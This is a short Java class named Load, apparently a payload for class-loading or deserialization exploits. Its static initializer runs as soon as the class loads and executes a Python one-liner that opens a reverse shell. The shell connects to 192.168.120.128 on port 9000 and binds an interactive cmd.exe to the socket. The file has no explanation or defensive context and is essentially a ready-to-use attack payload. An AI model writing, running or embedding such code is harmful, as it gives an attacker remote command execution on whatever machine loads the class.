package com.yyjccc.enity;

import java.io.IOException;

public class Load {

    static {
        try {
            Runtime.getRuntime().exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.120.128\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\",\"-i\"]);'");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
